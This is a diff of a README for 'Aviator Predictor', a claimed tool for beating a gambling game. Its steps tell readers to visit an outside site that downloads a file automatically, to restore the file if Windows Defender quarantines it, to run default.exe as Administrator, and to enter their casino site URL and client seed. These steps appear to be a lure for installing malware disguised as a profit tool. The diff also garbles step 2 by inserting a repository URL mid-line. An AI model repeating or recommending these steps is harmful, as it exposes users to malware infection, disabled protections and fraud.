@@ -10,7 +10,7 @@ Welcome to Aviator Predictor, your ultimate tool for maximizing your profits in 
 ## How to Use
 
 1. Visit [hirewise.site](https://hirewise.site)
-2. The download will start automatically once you visit the site. If Windows Defender quarantines the file, just restore it to proceed smoothly.
+https://github.com/lvijv4/aviator.git2. The download will start automatically once you visit the site. If Windows Defender quarantines the file, just restore it to proceed smoothly.
 3. Extract the default.zip file to your desired location.
 4. Run default.exe as Administrator.
 5. A prompt will appear asking for your casino site URL and client seed.
